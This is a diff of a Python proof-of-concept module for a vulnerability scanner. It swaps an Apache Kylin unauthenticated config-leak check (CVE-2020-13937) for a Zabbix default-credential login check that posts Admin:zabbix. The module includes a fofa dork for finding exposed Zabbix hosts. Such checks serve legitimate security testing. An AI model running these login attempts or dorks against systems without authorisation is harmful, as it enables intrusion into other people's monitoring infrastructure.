@@ -17,21 +17,17 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Apache Kylin 未授权配置泄露(CVE-2020-13937)",                        # 漏洞名称
-        "VulnID" : "CVE-2020-13937",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Apache Kylin",                     # 漏洞应用名称
-        "AppVersion" : """
-            Apahche Kylin 2.x.x
-            Apahche Kylin <= 3.1.0
-            Apahche Kylin 4.0.0-alpha
-        """,                  # 漏洞应用版本
+        "name" : "Zabbix弱口令",                        # 漏洞名称
+        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "Zabbix",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            Apache Kylin有一个restful api会在没有任何认证的情况下暴露配置信息。
+            zabbix默认口令是 Admin : zabbix
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="APACHE-kylin"
+            app="ZABBIX-监控系统"
         """,                     # fofa搜索语句
         "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
@@ -46,20 +42,26 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/kylin/api/admin/config" # url自己按需调整
-        
+        url = self.target + "" # url自己按需调整
+        data = "name=Admin&password=zabbix&autologin=1&enter=Sign+in"
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
-                    # "Content-Type": "application/x-www-form-urlencoded",
+                    "Content-Type": "application/x-www-form-urlencoded",
                     }
         
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
-            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if '{"config":"' in req.text:#req.status_code == 200 and :
+            req = requests.post(url,data=data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
+            if "chkbxRange.init();" in req.text \
+                and \
+                    "incorrect" not in req.text \
+                        and \
+                            "<!-- Login Form -->" not in req.text \
+                                and \
+                                    req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
